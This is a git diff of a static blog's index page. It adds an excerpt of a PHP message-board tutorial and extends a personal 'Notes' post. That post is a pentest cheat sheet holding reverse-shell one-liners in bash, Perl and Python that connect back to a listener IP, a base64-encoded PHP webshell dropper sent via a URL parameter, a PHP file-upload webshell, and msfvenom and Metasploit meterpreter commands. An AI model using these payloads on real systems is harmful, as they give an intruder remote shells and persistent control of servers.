@@ -330,6 +330,158 @@
   
   
   <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://chirec.github.io/2019/03/24/Create-Message-Board-with-PHP/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="chessur">
+      <meta itemprop="description" content="Freedom as Autonomy">
+      <meta itemprop="image" content="/images/cat.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Emerald Dream">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                
+                <a href="/2019/03/24/Create-Message-Board-with-PHP/" class="post-title-link" itemprop="url">'使用PHP编写留言板'</a>
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+
+            
+            
+            
+
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+
+              
+                
+              
+
+              <time title="Created: 2019-03-24 15:36:54 / Modified: 21:19:08" itemprop="dateCreated datePublished" datetime="2019-03-24T15:36:54+08:00">2019-03-24</time>
+            
+
+            
+              
+
+              
+            
+          </span>
+
+          
+
+          
+            
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          <h1 id="PHP留言板结构"><a href="#PHP留言板结构" class="headerlink" title="PHP留言板结构"></a>PHP留言板结构</h1><img src="/2019/03/24/Create-Message-Board-with-PHP/01.Structure.png">
+<h1 id="1-新建Message类"><a href="#1-新建Message类" class="headerlink" title="1.新建Message类"></a>1.新建Message类</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">class Message&#123;</span><br><span class="line">	public $name;</span><br><span class="line">	public $time;</span><br><span class="line">	public $content;</span><br><span class="line"></span><br><span class="line">	function __construct($n,$t,$c)&#123;</span><br><span class="line">		$this-&gt;name=$n;</span><br><span class="line">		$this-&gt;time=$t;</span><br><span class="line">		$this-&gt;content=$c;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	function show()&#123;</span><br><span class="line">		echo &quot;Name: &quot;.$this-&gt;name.&quot;&lt;br /&gt;&quot;;</span><br><span class="line">		echo &quot;Time: &quot;.$this-&gt;time.&quot;&lt;br /&gt;&quot;;</span><br><span class="line">		echo &quot;Content: &quot;.$this-&gt;content.&quot;&lt;br /&gt;&quot;;</span><br><span class="line">		echo &quot;===========================================&quot;.&quot;&lt;br /&gt;&quot;;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>Message对象包含3个属性，name、time、content，分别是留言用户名，留言时间、留言内容。<br>在创建对象时，构造函数使将值赋给对象的3个属性。<br>show()方法则是显示留言内容。</p>
+<h1 id="2-新建MessageBoard类"><a href="#2-新建MessageBoard类" class="headerlink" title="2.新建MessageBoard类"></a>2.新建MessageBoard类</h1><img src="/2019/03/24/Create-Message-Board-with-PHP/02.MessageBoard.png">
+          <!--noindex-->
+          
+            <div class="post-button text-center">
+              <a class="btn" href="/2019/03/24/Create-Message-Board-with-PHP/#more" rel="contents">
+                Read more &raquo;
+              </a>
+            </div>
+          
+          <!--/noindex-->
+        
+      
+    </div>
+
+    
+
+    
+    
+    
+
+    
+
+    
+      
+    
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
     <link itemprop="mainEntityOfPage" href="https://chirec.github.io/2019/03/21/Kail-Use-Shellinabox&Ngrok/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -1156,11 +1308,29 @@
                 
                   <span class="post-meta-item-text">Edited on</span>
                 
-                <time title="Modified: 2019-07-08 10:56:32" itemprop="dateModified" datetime="2019-07-08T10:56:32+08:00">2019-07-08</time>
+                <time title="Modified: 2019-07-12 20:27:04" itemprop="dateModified" datetime="2019-07-12T20:27:04+08:00">2019-07-12</time>
               
             
           </span>
 
+          
+            <span class="post-category">
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">In</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/Notes/" itemprop="url" rel="index"><span itemprop="name">Notes</span></a></span>
+
+                
+                
+              
+            </span>
           
 
           
@@ -1212,6 +1382,9 @@
 <h2 id="添加用户"><a href="#添加用户" class="headerlink" title="添加用户"></a>添加用户</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">useradd -d &quot;/home/chessur&quot; -m -s &quot;/bin/bash&quot; chessur</span><br><span class="line">//指定家目录</span><br><span class="line">//-m 若家目录不存在，则强制创建家目录</span><br><span class="line">//-s 指定shell</span><br></pre></td></tr></table></figure>
 <h2 id="ufw"><a href="#ufw" class="headerlink" title="ufw"></a>ufw</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ufw default deny //设置端口默认关闭</span><br><span class="line">ufw status //查看ufw状态</span><br><span class="line">ufw allow port //放行端口</span><br><span class="line">ufw enable //开启ufw</span><br></pre></td></tr></table></figure>
 <h2 id="单用户模式"><a href="#单用户模式" class="headerlink" title="单用户模式"></a>单用户模式</h2><p>开机选advanced，按e，找到<code>ro recovery nomodeset</code>，修改为<code>rw single init=/bin/bash</code> ，修改之后按F10或Ctrl+X进入单用户模式</p>
+<h2 id="MySQL"><a href="#MySQL" class="headerlink" title="MySQL"></a>MySQL</h2><h3 id="更改secure-file-priv"><a href="#更改secure-file-priv" class="headerlink" title="更改secure_file_priv"></a>更改secure_file_priv</h3><p>没有my.ini，my.cnf里什么都没有，MySQL版本5.7.26</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">vim /etc/mysql/my.cnf</span><br><span class="line">[mysqld]</span><br><span class="line">secure_file_priv=&apos;&apos;</span><br></pre></td></tr></table></figure>
+<p>参考：<br><a href="https://serverfault.com/questions/820447/cant-set-secure-file-priv-on-mysql-5-7-ubuntu-16-04" target="_blank" rel="noopener">can’t set secure_file_priv on mysql 5.7 Ubuntu 16.04</a></p>
 <h1 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h1><h2 id="Bash"><a href="#Bash" class="headerlink" title="Bash"></a>Bash</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/192.168.126.1/6666 0&gt;&amp;1</span><br><span class="line">bash -i 5&lt;&gt;/dev/tcp/192.168.126.1/6666 0&gt;&amp;5 1&gt;&amp;5</span><br></pre></td></tr></table></figure>
 <h2 id="PERL"><a href="#PERL" class="headerlink" title="PERL"></a>PERL</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">perl -e &apos;use Socket;$i=&quot;192.168.126.1&quot;;$p=6666;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;/bin/sh -i&quot;);&#125;;&apos;</span><br></pre></td></tr></table></figure>
 <h2 id="python"><a href="#python" class="headerlink" title="python"></a>python</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c &apos;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;192.168.126.1&quot;,6666));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&apos;</span><br></pre></td></tr></table></figure>
@@ -1239,7 +1412,9 @@
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?a=fputs(fopen(base64_decode(c2hlbGwucGhw),w),base64_decode(base64_decode(UEQ5d2FIQWdEUXBBSkhSbGJYQWdQU0FrWDBaSlRFVlRXeWQxY0d4dllXUmZabWxzWlNkZFd5ZDBiWEJmYm1GdFpTZGRPdzBLUUNSbWFXeGxJRDBnWW1GelpXNWhiV1VvSkY5R1NVeEZVMXNuZFhCc2IyRmtYMlpwYkdVblhWc25ibUZ0WlNkZEtUc05DbWxtSUNobGJYQjBlU0FvSkdacGJHVXBLWHNOQ21WamFHOGdJanhtYjNKdElHRmpkR2x2YmlBOUlDY25JRzFsZEdodlpDQTlJQ2RRVDFOVUp5QkZUa05VV1ZCRlBTZHRkV3gwYVhCaGNuUXZabTl5YlMxa1lYUmhKejVjYmlJN1pXTm9ieUFpVEc5allXd2dabWxzWlRvZ1BHbHVjSFYwSUhSNWNHVWdQU0FuWm1sc1pTY2dibUZ0WlNBOUlDZDFjR3h2WVdSZlptbHNaU2MrWEc0aU8yVmphRzhnSWp4cGJuQjFkQ0IwZVhCbElEMGdKM04xWW0xcGRDY2dkbUZzZFdVZ1BTQW5WWEJzYjJGa0p6NWNiaUk3WldOb2J5QWlQQzltYjNKdFBseHVQSEJ5WlQ1Y2JseHVQQzl3Y21VK0lqdDlaV3h6WlNCN2FXWW9iVzkyWlY5MWNHeHZZV1JsWkY5bWFXeGxLQ1IwWlcxd0xDUm1hV3hsS1NsN1pXTm9ieUFpUm1sc1pTQjFjR3h2WVdSbFpDQnpkV05qWlhOelpuVnNiSGt1UEhBK1hHNGlPMzFsYkhObElIdGxZMmh2SUNKVmJtRmliR1VnZEc4Z2RYQnNiMkZrSUNJZ0xpQWtabWxzWlNBdUlDSXVQSEErWEc0aU8zMTlQejQ9)));</span><br></pre></td></tr></table></figure>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">@$temp = $_FILES[&apos;upload_file&apos;][&apos;tmp_name&apos;];</span><br><span class="line">@$file = basename($_FILES[&apos;upload_file&apos;][&apos;name&apos;]);</span><br><span class="line">if (empty ($file))&#123;</span><br><span class="line">echo &quot;&lt;form action = &apos;&apos; method = &apos;POST&apos; ENCTYPE=&apos;multipart/form-data&apos;&gt;\n&quot;;echo &quot;Local file: &lt;input type = &apos;file&apos; name = &apos;upload_file&apos;&gt;\n&quot;;echo &quot;&lt;input type = &apos;submit&apos; value = &apos;Upload&apos;&gt;\n&quot;;echo &quot;&lt;/form&gt;\n&lt;pre&gt;\n\n&lt;/pre&gt;&quot;;&#125;else &#123;if(move_uploaded_file($temp,$file))&#123;echo &quot;File uploaded successfully.&lt;p&gt;\n&quot;;&#125;else &#123;echo &quot;Unable to upload &quot; . $file . &quot;.&lt;p&gt;\n&quot;;&#125;&#125;?&gt;</span><br></pre></td></tr></table></figure>
 <h1 id="MSF"><a href="#MSF" class="headerlink" title="MSF"></a>MSF</h1><p>反弹shell</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">use exploit/multi/script/web_delivery</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">use exploit/multi/script/web_delivery</span><br><span class="line">set payload php/meterpreter/reverse_tcp</span><br></pre></td></tr></table></figure>
+<p>生成php反弹shell</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p php/meterpreter/reverse_tcp lhost=192.168.126.126 lport=126 -f raw -o reverse_shell.php</span><br><span class="line">use exploit/multi/handler</span><br></pre></td></tr></table></figure>
 <h1 id="Mysql"><a href="#Mysql" class="headerlink" title="Mysql"></a>Mysql</h1><p>命令行导入数据库</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql -uroot -pPassword databasename &lt; filedir</span><br></pre></td></tr></table></figure>
 <h1 id="后台拿Shell"><a href="#后台拿Shell" class="headerlink" title="后台拿Shell"></a>后台拿Shell</h1><p>修改模板代码</p>
@@ -1342,7 +1517,7 @@
                 
                   <a href="/archives/">
                 
-                    <span class="site-state-item-count">35</span>
+                    <span class="site-state-item-count">36</span>
                     <span class="site-state-item-name">posts</span>
                   </a>
                 </div>
@@ -1371,7 +1546,9 @@
                     
                       
                     
-                    <span class="site-state-item-count">6</span>
+                      
+                    
+                    <span class="site-state-item-count">7</span>
                     <span class="site-state-item-name">categories</span>
                   </a>
                 </div>
@@ -1400,7 +1577,9 @@
                     
                       
                     
-                    <span class="site-state-item-count">6</span>
+                      
+                    
+                    <span class="site-state-item-count">7</span>
                     <span class="site-state-item-name">tags</span>
                   </a>
                 </div>
